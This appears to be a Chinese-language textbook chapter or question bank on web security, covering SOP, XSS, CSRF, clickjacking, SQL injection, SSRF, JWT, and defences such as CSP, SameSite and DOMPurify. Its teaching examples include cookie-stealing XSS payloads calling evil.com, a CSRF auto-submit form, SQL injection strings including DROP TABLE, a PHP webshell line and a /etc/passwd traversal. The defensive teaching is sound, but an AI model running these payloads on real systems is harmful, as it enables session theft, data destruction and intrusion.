## Chapter 7: Web安全终极题库

### 7.1 Web安全本质与浏览器安全模型

#### 7.1.1 Web安全本质

Web安全本质是**在不可信的网络环境中构建可信的应用**。攻击者的目标是窃取数据、劫持会话、执行任意代码；防御者的目标是确保数据的机密性、完整性和可用性（CIA 三元组）。

浏览器作为Web应用的运行时，是安全攻防的主战场。浏览器安全模型由多层防护机制构成：

```
┌─────────────────────────────────────────────────────┐
│                    浏览器安全模型                      │
├─────────────────────────────────────────────────────┤
│  1. 进程隔离          (渲染进程 vs 浏览器主进程)        │
│  2. 同源策略 (SOP)     (域间隔离)                      │
│  3. 沙箱机制           (限制代码能力)                   │
│  4. 安全上下文          (HTTPS / localhost)           │
│  5. CSP / CORS         (资源加载控制)                  │
│  6. CORB / CORP / COEP  (侧信道攻击缓解)               │
│  7. SameSite Cookie    (CSRF防护)                    │
└─────────────────────────────────────────────────────┘
```

#### 7.1.2 浏览器进程隔离

现代浏览器使用**多进程架构**：

```
┌──────────────┐   ┌──────────────┐   ┌──────────────┐
│  浏览器主进程  │   │  渲染进程 A   │   │  渲染进程 B   │
│  (Browser)   │   │  (Renderer)  │   │  (Renderer)  │
│              │   │              │   │              │
│  - 地址栏     │   │  - JS引擎    │   │  - JS引擎    │
│  - 网络请求   │   │  - DOM树     │   │  - DOM树     │
│  - 插件管理   │   │  - 布局引擎   │   │  - 布局引擎   │
│  - 存储管理   │   │  - 事件循环   │   │  - 事件循环   │
└──────────────┘   └──────────────┘   └──────────────┘
        ↑                  ↑                  ↑
        └──────────────────┴──────────────────┘
                    IPC 进程间通信
```

每个标签页运行在独立的渲染进程中，通过IPC与浏览器主进程通信。渲染进程的JS无法直接访问文件系统、网络进程只能通过MessageChannel与渲染进程通信。

---

### 7.2 同源策略 (Same-Origin Policy, SOP)

#### 7.2.1 什么是同源

**同源**指协议 + 域名 + 端口三者完全相同。

| URL A                          | URL B                      | 是否同源    |
|--------------------------------|----------------------------|-----------|
| `https://a.example.com:443`    | `https://a.example.com:443`| 同源        |
| `https://a.example.com:443`    | `https://b.example.com:443`| 不同源(域不同)|
| `https://a.example.com:443`    | `http://a.example.com:443` | 不同源(协议不同)|
| `https://a.example.com:443`    | `https://a.example.com:8080`| 不同源(端口不同)|

#### 7.2.2 SOP限制了什么

同源策略限制以下跨域行为：

```
┌──────────────────────────────────────────────┐
│              同源策略 (SOP) 限制               │
├──────────────────────────────────────────────┤
│  ✗ Cookie / LocalStorage / IndexedDB 访问    │
│  ✗ DOM 跨域读写                               │
│  ✗ XMLHttpRequest / Fetch 跨域请求            │
│  ✗ iframe 跨域内容访问                         │
│                                               │
│  ✓ <script src> (可跨域加载JS)                │
│  ✓ <link href> (可跨域加载CSS)                │
│  ✓ <img src> (可跨域加载图片)                  │
│  ✓ @font-face 跨域字体                         │
└──────────────────────────────────────────────┘
```

#### 7.2.3 为什么必须有SOP

如果浏览器没有SOP，任意网页的JS都能读取`bank.com`的Cookie、DOM和LocalStorage：

```javascript
// 恶意网站 https://evil.com 的JS
fetch('https://bank.com/api/balance')  // 自动携带cookie
  .then(r => r.json())
  .then(data => sendToAttacker(data));

document.getElementById('bank-frame').contentDocument; // 读取iframe内容
```

**SOP是浏览器安全的基石**，它将Web划分为安全域，防止恶意脚本访问敏感资源。

---

### 7.3 XSS（跨站脚本攻击）

#### 7.3.1 什么是XSS

XSS（Cross-Site Scripting）指攻击者将恶意脚本注入到受信任的网页中执行。

**为什么XSS极其危险？**

```
XSS 能做的事:
  1. 窃取 Cookie/Token      → 劫持用户会话
  2. 读取 LocalStorage      → 窃取敏感数据
  3. 监听键盘输入           → 窃取密码/信用卡号
  4. 修改DOM               → 伪造登录框钓鱼
  5. 调用Web API           → 以受害者身份操作
  6. 蠕虫传播               → 自动扩散到其他用户
```

#### 7.3.2 XSS分类

```
┌──────────────────────────────────────────────────────┐
│                     XSS 三种类型                       │
├──────────────┬───────────────┬───────────────────────┤
│   存储型XSS   │   反射型XSS     │      DOM型XSS          │
├──────────────┼───────────────┼───────────────────────┤
│ 恶意代码永久   │ URL参数中携带   │ 前端JS从URL/DOM读取    │
│ 保存在服务器   │ 恶意脚本,服务器 │ 数据并直接写入DOM,     │
│               │ 直接拼接返回    │ 不经过服务器           │
│ 危害最大       │ 危害较小       │ 危害较小               │
│ 典型:评论/帖子  │ 典型:搜索结果   │ 典型: #fragment参数    │
└──────────────┴───────────────┴───────────────────────┘
```

**反射型XSS示例：**

```php
<!-- 服务器直接将URL参数输出到HTML -->
<p>搜索结果: <?php echo $_GET['q']; ?></p>

<!-- 攻击URL -->
https://site.com/search?q=<script>fetch('https://evil.com/steal?c='+document.cookie)</script>

<!-- 服务器返回 -->
<p>搜索结果: <script>fetch('https://evil.com/steal?c='+document.cookie)</script></p>
```

**存储型XSS示例：**

```javascript
// 攻击者在评论区发表:
用户名: hacker
评论内容: <img src=x onerror="fetch('https://evil.com/steal?c='+document.cookie)">

// 该评论存入数据库,所有访问该页面的用户都会执行恶意脚本
```

**DOM型XSS示例：**

```javascript
// 前端JS直接读取URL hash并写入页面
const hash = location.hash;  // #<img src=x onerror=alert(1)>
document.getElementById('output').innerHTML = decodeURIComponent(hash.substring(1));
// 无需服务器参与,纯前端即可触发
```

#### 7.3.3 存储型/反射型/DOM型XSS区别

```
攻击流程对比:

存储型XSS:
  攻击者 → 提交恶意脚本 → 服务器(持久化) → 其他用户访问 → 脚本执行
           ↓数据库
        [恶意脚本永久保存]

反射型XSS:
  攻击者 → 构造恶意URL → 受害者点击URL → 服务器解析参数 → 脚本执行
           URL参数       (拼接进响应)    (不持久化)

DOM型XSS:
  攻击者 → 构造恶意URL → 受害者点击URL → 前端JS解析 → 直接修改DOM
           URL/hash      (纯前端处理)    (无需服务器参与)
```

**核心区别：**

| 维度       | 存储型           | 反射型           | DOM型           |
|-----------|-----------------|-----------------|----------------|
| 恶意代码位置 | 服务器数据库     | URL参数          | 前端JS/DOM      |
| 是否持久   | 永久             | 不持久           | 不持久          |
| 触发方式   | 访问页面          | 点击特殊URL      | 修改URL hash    |
| 服务器参与 | 是               | 是               | 否(纯前端)      |

---

### 7.4 XSS防御

#### 7.4.1 通用防御措施

**1. 输入过滤与输出编码**

```javascript
// 输出编码函数
function escapeHtml(str) {
  return str
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#x27;');
}

// 在输出到HTML时使用
element.textContent = userInput;        // 安全: 不会执行HTML
element.setAttribute('title', userInput); // 安全
// element.innerHTML = userInput;       // 危险: 可能含恶意脚本
```

**2. CSP (Content Security Policy)**

CSP通过HTTP响应头指示浏览器只允许加载特定来源的资源，从根本上禁止内联脚本执行：

```nginx
# Nginx配置
add_header Content-Security-Policy "
  default-src 'self';
  script-src 'self' 'nonce-{random}';
  style-src 'self' 'nonce-{random}';
  img-src 'self' https: data:;
  connect-src 'self' https://api.example.com;
  frame-ancestors 'none';
" always;
```

```
CSP指令说明:
  default-src 'self'           → 默认只允许同源资源
  script-src 'self'            → JS只允许同源
  script-src 'nonce-abc123'    → 只允许带此nonce的内联脚本
  script-src 'unsafe-inline'   → 允许内联脚本 (不推荐!)
  script-src 'unsafe-eval'     → 允许eval() (不推荐!)
  frame-ancestors 'none'       → 禁止被iframe嵌入
  img-src data:                → 允许data:URI图片
```

**CSP为什么能防XSS？**

```
传统XSS攻击流程:
  攻击者注入: <script src="https://evil.com/xss.js"></script>

CSP生效后:
  script-src 'self'             → 拒绝加载evil.com的脚本
  'nonce-xxx' 要求脚本必须有正确nonce → 内联脚本被阻止

即使攻击者注入 <script>alert(1)</script>:
  → 无效,因为CSP禁止unsafe-inline
  → 即使能注入,也无法执行
```

**3. HttpOnly Cookie**

```http
Set-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Strict
```

```
HttpOnly标志的作用:
  ✓ JS无法通过 document.cookie 读取该cookie
  ✓ XSS脚本无法窃取sessionId
  ✗ 但攻击者仍可通过XSS发起CSRF请求(自动携带cookie)

HttpOnly不能防止XSS:
  → 攻击者虽然拿不到cookie,但可以:
    - 读取页面内容(绕过CSRF token可见性)
    - 发起AJAX请求(请求仍会自动携带cookie)
    - 修改页面DOM(钓鱼攻击)
    - 触发其他恶意行为
```

#### 7.4.2 React的安全机制

**React为什么相对安全？**

```jsx
// React默认会对所有插入的内容进行转义
function SafeComponent({ userInput }) {
  return <div>{userInput}</div>;
  // <div>&lt;script&gt;alert(1)&lt;/script&gt;</div>
  // 渲染为文本,不会执行为JS
}

// 但使用 innerHTML 就会绕过React的转义:
function DangerousComponent({ userInput }) {
  return <div dangerouslySetInnerHTML={{ __html: userInput }} />;
  // 如果userInput含<script>,会执行!
}
```

**dangerouslySetInnerHTML的危险：**

```jsx
// 危险示例 - 攻击者控制的内容
function Comment({ content }) {
  // content来自用户输入,可能含恶意脚本
  return <div dangerouslySetInnerHTML={{ __html: content }} />;
}

// 即使内容看起来安全,也可能被绕过:
const maliciousContent = `<img src="x" onerror="
  fetch('https://evil.com?data='+document.cookie)
" />`;
```

**DOMPurify原理：**

```javascript
// DOMPurify使用浏览器原生DOM解析器,安全净化HTML
import DOMPurify from 'dompurify';

// 净化HTML,移除危险内容
const clean = DOMPurify.sanitize(dangerousHtml, {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'p', 'br'],  // 只允许安全标签
  ALLOWED_ATTR: ['class'],                                // 只允许安全属性
  FORBID_TAGS: ['script', 'iframe', 'object', 'embed'],   // 禁止危险标签
  FORBID_ATTR: ['onerror', 'onload', 'onclick', 'onmouseover'], // 禁止事件属性
});

// 净化过程:
const dirty = '<p>Hello</p><script>alert(1)</script><img src=x onerror=alert(1)>';
// → '<p>Hello</p><img src="x">'
```

DOMPurify的核心原理：
1. 使用浏览器的`DOMParser`将HTML字符串解析为DOM节点树
2. 遍历节点树，只保留白名单中的标签和属性
3. 丢弃所有事件处理器属性（如`onerror`、`onclick`）
4. 对URL属性进行协议白名单检查（禁止`javascript:`）
5. 序列化净化后的DOM为HTML字符串

---

### 7.5 CSRF（跨站请求伪造）

#### 7.5.1 什么是CSRF

CSRF（Cross-Site Request Forgery）利用用户已登录的身份，诱导用户浏览器向目标站点发起非预期的请求：

```
正常用户登录银行:
  银行网站 → 设置Cookie: sessionId=abc123

攻击者构造恶意页面 https://evil.com/csrf:
  ┌─────────────────────────────────────────────────┐
  │ <html>                                           │
  │ <body onload="document.forms[0].submit()">        │
  │   <form action="https://bank.com/transfer"        │
  │         method="POST">                           │
  │     <input name="to" value="attacker" />         │
  │     <input name="amount" value="10000" />         │
  │   </form>                                        │
  │ </body>                                          │
  │ </html>                                          │
  └─────────────────────────────────────────────────┘

用户访问evil.com时:
  1. 浏览器加载HTML,自动提交表单
  2. 请求发送到bank.com,自动携带cookie
  3. 银行验证cookie(有效),执行转账
  4. 用户毫不知情
```

#### 7.5.2 CSRF为什么能成功

CSRF成立的两个前提：
1. **浏览器自动携带Cookie**：符合HTTP规范，浏览器发往`bank.com`的请求会自动携带该域的Cookie
2. **Cookie-based认证**：服务器只验证Cookie，不验证请求来源

```
攻击者无法做到:
  ✗ 读取bank.com的Cookie(SOP限制)
  ✗ 读取bank.com的响应(SOP限制)

攻击者可以做到:
  ✓ 诱导浏览器向bank.com发送请求(表单/图片/脚本均可发起GET/POST)
  ✓ 浏览器会自动携带bank.com的Cookie
  ✓ 服务器只验证Cookie有效性,不验证请求来源
```

#### 7.5.3 SameSite Cookie原理

```http
SameSite=Lax  (Chrome 67+ 默认)
Set-Cookie: sessionId=abc123; SameSite=Lax

SameSite=Strict
Set-Cookie: sessionId=abc123; SameSite=Strict

SameSite=None (需要Secure)
Set-Cookie: sessionId=abc123; SameSite=None; Secure
```

```
SameSite行为:
  Strict  → 所有跨站请求都不携带cookie
            用户从外部链接跳转也不行(体验差)
  Lax     → GET请求允许携带cookie, POST/iframe不允许
            (大多数CSRF是POST, Lax可以防护大部分)
  None    → 不限制(旧行为,需要Secure)

实际例子:
  SameSite=Lax时:
    <a href="https://bank.com"> → GET, 携带cookie ✓
    <form method="POST">        → POST, 不携带cookie ✗
    <img src="https://bank.com/api"> → GET, 携带cookie ✓
    第三方页面JS fetch()        → 不携带cookie ✗
```

#### 7.5.4 CSRF Token原理

```html
<!-- 服务器响应: HTML表单中嵌入token -->
<form action="/transfer" method="POST">
  <input type="hidden" name="csrf_token" value="7k3d9f2...">
  ...
</form>
```

```javascript
// 服务器端验证CSRF Token
function validateCsrfToken(req) {
  const sessionToken = req.session.csrfToken;    // 从Session读取
  const requestToken = req.body.csrf_token ||    // POST body
                      req.headers['x-csrf-token']; // 或header

  if (!sessionToken || !requestToken) {
    throw new Error('Missing CSRF token');
  }

  if (!crypto.timingSafeEqual(
    Buffer.from(sessionToken),
    Buffer.from(requestToken)
  )) {
    throw new Error('Invalid CSRF token');
  }
}
```

```
CSRF Token防护原理:
  攻击者构造恶意页面时:
    - 无法读取目标页面的HTML(同源策略)
    - 无法获取表单中的csrf_token值
    - 发送的请求不带正确的csrf_token
    - 服务器验证失败 → 请求被拒绝
```

#### 7.5.5 为什么XSS能绕过CSRF

XSS攻击者可以通过JS读取页面内容，从而获取CSRF Token：

```javascript
// 存储型XSS注入后,攻击者可以:
// 1. 读取页面中的CSRF Token
const token = document.querySelector('input[name="csrf_token"]').value;

// 2. 使用正确的Token发起请求(绕过CSRF防护)
fetch('/transfer', {
  method: 'POST',
  body: `to=attacker&amount=10000&csrf_token=${token}`,
  credentials: 'include'  // 携带Cookie
});

// 3. 甚至可以读取响应内容
const response = await fetch('/transfer');
const result = await response.text();
sendToAttacker(result);
```

```
防御思路:
  XSS是CSRF Token的"天敌":
    ✗ 纯前端CSRF Token → XSS可以读取
    ✓ 真正解决方案:
       (1) 严格防护XSS(消除XSS才能保证CSRF防护有效)
       (2) 使用SameSite Cookie(不依赖Token)
       (3) 验证Origin/Referer头(辅助手段)
```

---

### 7.6 点击劫持 (Clickjacking)

#### 7.6.1 什么是点击劫持

攻击者通过`iframe`将目标网站覆盖在恶意页面上，通过视觉欺骗诱导用户点击：

```html
<!-- 恶意页面 -->
<style>
  iframe { position:absolute; top:100px; left:50px;
    opacity:0.1; width:600px; height:400px; }
  button { position:absolute; top:200px; left:200px; z-index:1; }
</style>

<iframe src="https://bank.com/send-money?to=attacker&amount=10000"></iframe>
<button>领取奖励</button>
<!-- 实际点击的是iframe中的"确认转账"按钮 -->
```

#### 7.6.2 Clickjacking防御

**1. X-Frame-Options 响应头**

```http
X-Frame-Options: DENY       <!-- 完全禁止被iframe嵌入 -->
X-Frame-Options: SAMEORIGIN <!-- 只允许同源iframe -->
```

**2. CSP frame-ancestors指令**

```http
Content-Security-Policy: frame-ancestors 'none';
Content-Security-Policy: frame-ancestors 'self' https://trusted.com;
```

#### 7.6.3 iframe sandbox原理

```html
<!-- sandbox属性完全隔离iframe内的代码能力 -->
<iframe src="https://untrusted.com/page" sandbox="
  allow-scripts          <!-- 允许执行JS -->
  allow-same-origin      <!-- 允许同源访问(会降低安全性) -->
"></iframe>
```

```
sandbox隔离的能力:
  ✗ 修改父页面DOM
  ✗ 读取父页面Cookie/Storage
  ✗ 发起跨域请求(但form提交仍可发往任何域)
  ✗ 使用top/history API修改URL
  ✓ 可以展示内容
  ✓ 可以执行JS(加了allow-scripts)
```

---

### 7.7 SQL注入

#### 7.7.1 什么是SQL注入

攻击者在输入中注入SQL语句，破坏原有SQL的逻辑：

```javascript
// 危险代码 - 直接拼接用户输入
const query = `SELECT * FROM users WHERE
  username = '${username}' AND password = '${password}'`;

// 用户输入: username = admin' --
// 拼接后:
SELECT * FROM users WHERE username = 'admin' --' AND password = 'anything'
// ' -- 后面的内容变成注释,密码验证被绕过!

// 其他恶意输入:
username = "admin' OR '1'='1' --"   // 永真条件,绕过认证
username = "'; DROP TABLE users; --" // 删除整个表!
```

#### 7.7.2 SQL注入防御

```javascript
// ✅ 使用参数化查询(Prepared Statements)
const query = 'SELECT * FROM users WHERE username = ? AND password = ?';
db.execute(query, [username, password]);
// 参数与SQL结构分离,输入被当作纯数据处理,无法改变SQL结构

// ✅ 使用ORM框架(自动参数化)
const user = await User.findOne({
  where: { username, password: hash(password) }
});

// ✅ 输入验证 + 最小权限原则
function validateUsername(input) {
  return /^[a-zA-Z0-9_]{3,20}$/.test(input);
}
```

---

### 7.8 SSRF 与 DDoS

#### 7.8.1 SSRF（服务器端请求伪造）

```javascript
// 危险: 用户提供URL,服务器发起请求
app.get('/fetch', async (req, res) => {
  const { url } = req.query;
  // 攻击者可以用这个接口:
  // 1. 访问内网服务: url = http://192.168.1.1/admin
  // 2. 访问云元数据: url = http://169.254.169.254/latest/meta-data/
  // 3. 扫描内网端口
  const response = await fetch(url);
  const data = await response.text();
  res.send(data);
});
```

**SSRF防御：** 输入URL白名单验证、禁止访问内网IP段（10.x/172.16.x/192.168.x）、禁止访问云元数据地址、限制请求方法和响应大小。

#### 7.8.2 DDoS（分布式拒绝服务）

```
DDoS攻击类型:
  1. 带宽消耗型   → 发送大量流量,堵死带宽
  2. 协议攻击     → SYN Flood, 利用TCP握手消耗服务器资源
  3. 应用层攻击   → HTTP Flood, 发送大量看似合法的请求
  4. 僵尸网络     → 利用大量被控设备(肉鸡)同时发起请求

防御手段: CDN分发流量、WAF防火墙、限流、CAPTCHA、Anycast架构
```

---

### 7.9 中间人攻击与HTTPS

#### 7.9.1 什么是中间人攻击

```
正常通信:
  用户 ←─────── 加密 ───────→ 服务器

中间人攻击:
  用户 ←─── 攻击者的证书/隧道 ───→ 攻击者 ←─── 加密 ───→ 服务器
         (解密后查看/修改内容)        (转发并重新加密)
```

#### 7.9.2 HTTPS如何防止MITM

```
TLS握手流程:
  1. 客户端 → 服务器: ClientHello (支持的加密套件, 随机数)
  2. 服务器 → 客户端: ServerHello (选中的加密套件, 随机数)
                   + 证书 (包含公钥, 由CA签发)
  3. 客户端 → 服务器: PreMasterSecret (用证书公钥加密)
  4. 双方计算MasterSecret,建立对称加密密钥
  5. 此后所有通信使用对称加密

中间人为什么失败:
  攻击者没有服务器的私钥 → 无法解密PreMasterSecret
  → 无法计算出对称密钥 → 无法解密/篡改后续通信
```

**HSTS**强制浏览器只使用HTTPS：

```http
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
```

---

### 7.10 文件上传漏洞与路径穿越

#### 7.10.1 文件上传漏洞

```javascript
// 危险: 直接保存用户上传的文件
app.post('/upload', (req, res) => {
  const file = req.files.avatar;
  file.mv('/uploads/' + file.name);  // 恶意文件名可造成问题

  // 攻击者上传: 1.php, 内容为 <?php system("ls"); ?>
  // 访问 https://app.com/uploads/1.php?cmd=ls → 执行任意命令!
});

// 安全做法:
function secureUpload(file) {
  // 1. 验证文件类型(MIME + 扩展名 + 魔数)
  // 2. 生成随机文件名 crypto.randomUUID()
  // 3. 保存到隔离的非可执行目录
  // 4. 对图片进行二次渲染(去除可能的嵌入代码)
}
```

#### 7.10.2 路径穿越

```javascript
// 危险: 用户可通过 ../ 穿越目录
app.get('/download', (req, res) => {
  const file = req.query.file;
  // ?file=../../etc/passwd → 实际路径: /etc/passwd
  res.sendFile('/uploads/' + file);
});

// 防御: 使用path.resolve并验证最终路径
const safePath = path.resolve('/uploads', userInput);
if (!safePath.startsWith('/uploads/')) {
  throw new Error('Invalid path');
}
```

---

### 7.11 JWT安全问题与Token泄漏风险

#### 7.11.1 JWT结构

```
JWT = Header.Payload.Signature

eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.    ← Header(JSON → Base64)
eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6Ik  ← Payload(JSON → Base64)
pXVCJ9.                                 ← Signature(HS256)

Header:  {"alg":"HS256","typ":"JWT"}
Payload: {"sub":"1234567890","name":"John","iat":1516239022,"exp":...}
```

#### 7.11.2 Token泄漏风险

```javascript
// ❌ 危险: 存放在LocalStorage → XSS攻击可直接读取
localStorage.setItem('token', jwt);

// ✅ 相对安全: HttpOnly Cookie (但可能被CSRF利用)
res.cookie('token', jwt, { httpOnly: true, secure: true, sameSite: 'strict' });

// ✅ 更安全: Memory (页面刷新会丢失, 需要Refresh Token配合)
```

#### 7.11.3 JWT其他安全问题

```javascript
// 1. alg:none攻击 → 不验证签名,伪造payload
{"alg":"none","typ":"JWT"}

// 2. 密钥混淆 → HS256用RS256公钥当密钥
// 3. 不设置exp → Token永不过期
// 4. 弱密钥 → 暴力破解
```

---

### 7.12 Session Fixation 与 重放攻击

#### 7.12.1 Session Fixation

```
攻击流程:
  1. 攻击者获取Session ID: abc123
  2. 构造链接诱导受害者使用该ID登录
  3. 受害者登录后,攻击者用abc123访问 → 以受害者身份操作

防御: 用户登录后更换Session ID
```

#### 7.12.2 重放攻击

```javascript
// 防御1: 使用Nonce (一次性随机数)
const nonce = crypto.randomBytes(16).toString('hex');
const request = { action: 'transfer', amount: 1000, nonce, timestamp: Date.now() };
server.usedNonces.add(nonce);

// 防御2: 时间戳验证
if (request.timestamp < Date.now() - 5 * 60 * 1000) {
  throw new Error('Request expired');
}
```

---

### 7.13 数字签名与 HMAC

#### 7.13.1 数字签名原理

```
签名过程:
  消息 → Hash函数 → 摘要 → 用私钥加密 → 数字签名

验签过程:
  接收消息+签名 → 用公钥解密 → 得到摘要A
              → 对消息Hash → 得到摘要B
              → A===B? → 验证通过

关键: 私钥只有签名者知道,无法从公钥推导,Hash无法逆向
```

#### 7.13.2 HMAC原理

HMAC（Hash-based Message Authentication Code）使用共享密钥生成认证码：

```javascript
const crypto = require('crypto');

function hmacSign(message, secret) {
  return crypto.createHmac('sha256', secret).update(message).digest('hex');
}

function hmacVerify(msg, sig, secret) {
  return crypto.timingSafeEqual(
    Buffer.from(sig, 'hex'),
    Buffer.from(hmacSign(msg, secret), 'hex')
  );
}

// GitHub Webhook使用HMAC-SHA256验证签名
```

---

### 7.14 WebSocket 安全问题

```javascript
// 1. 无同源策略限制: WebSocket不受SOP限制
//    → 任何页面都可连接你的WebSocket服务器

// 2. 防御: 使用Origin验证
const wss = new WebSocket.Server({
  verifyClient: (info) => allowed.includes(info.origin)
});

// 3. 必须使用 WSS (WebSocket Secure)
const ws = new WebSocket('wss://secure.com/ws');  // ✓ 加密
const ws = new WebSocket('ws://insecure.com/ws'); // ✗ 不安全

// 4. 身份验证: Cookie不会自动发送,需在握手时传Token
```

---

### 7.15 OAuth2 安全问题

```javascript
// OAuth2常见安全漏洞:
const issues = [
  'redirect_uri不验证 → 攻击者构造恶意回调地址',
  'state参数不验证 → 遭受CSRF攻击',
  'client_secret明文存储在前端 → 完全暴露',
  'scope不限制 → 拿了全部权限',
  '隐式流Token暴露 → 不使用隐式流',
  '缺少PKCE → 授权码被拦截',
];

// PKCE流程 (防止授权码拦截):
// 1. 客户端生成code_verifier
// 2. 计算code_challenge=SHA256(verifier)
// 3. 发送challenge,服务器返回code
// 4. 用code+verifier换取token
// 5. 服务器验证challenge匹配
```

---

### 7.16 浏览器沙箱机制

```
浏览器沙箱层级:

┌─────────────────────────────────────────────────┐
│               操作系统 (Ring 0 - 内核)            │
├─────────────────────────────────────────────────┤
│  浏览器主进程 (网络/磁盘/GPU访问)                  │
├─────────────────────────────────────────────────┤
│  渲染进程 (沙箱内,受限syscall)                    │
│    ├─ JS引擎 (V8)                               │
│    ├─ DOM/CSS引擎                               │
│    └─ 事件系统                                   │
│         ↓                                       │
│    只能通过IPC与浏览器主进程通信                    │
│    无法直接访问文件系统                             │
│    无法直接调用系统API                            │
└─────────────────────────────────────────────────┘

Chrome进程模型:
  - Site Isolation: 不同站点页面在独立进程中
  - 每个渲染进程沙箱化,即使V8被攻破也难以逃逸
```

---

### 7.17 CORB / CORP / COEP / COOP

这些是浏览器侧信道攻击缓解机制：

```http
# CORP (Cross-Origin Resource Policy) — 声明谁可加载你的资源
Cross-Origin-Resource-Policy: same-origin | same-site | cross-origin

# COEP (Cross-Origin-Embedder-Policy) — 要求子资源明确授权
Cross-Origin-Embedder-Policy: require-corp

# COOP (Cross-Origin-Opener-Policy) — 浏览上下文跨域隔离
Cross-Origin-Opener-Policy: same-origin | same-origin-allow-popups
```

```
为什么需要这些头部? → 防止Spectre类侧信道攻击

COEP+COOP+CORP配合:
  COEP → 所有子资源必须显式允许跨域访问
  COOP → 不同源页面独立进程,不能通过opener通信
  CORP → 资源明确声明谁可以加载

三者合一 → 恶意页面无法通过<script>加载敏感数据,
          无法通过window.open/opener跨域通信
```

---

### 7.18 Spectre漏洞

```
Spectre (CVE-2018-3639, CVE-2018-3640):

原理:
  1. CPU有预测执行(Speculative Execution)特性
     → 在分支结果确定前,CPU已提前执行分支代码
  2. 攻击者通过training使CPU误判分支
  3. 利用CPU缓存侧信道(访问时间差异)读取任意内存

在浏览器中的攻击:
  → 恶意JS利用预测执行读取同进程内其他域的内存数据
  → 可能泄露跨域cookie/密码/Token等

缓解措施:
  - Site Isolation: 跨域页面放不同进程
  - COEP+COOP: 隔离浏览上下文
  - 限制SharedArrayBuffer(高精度计时器)
  - 降低定时器精度(performance.now()节流)
```

---

# ====== END OF CHAPTER 7 ======
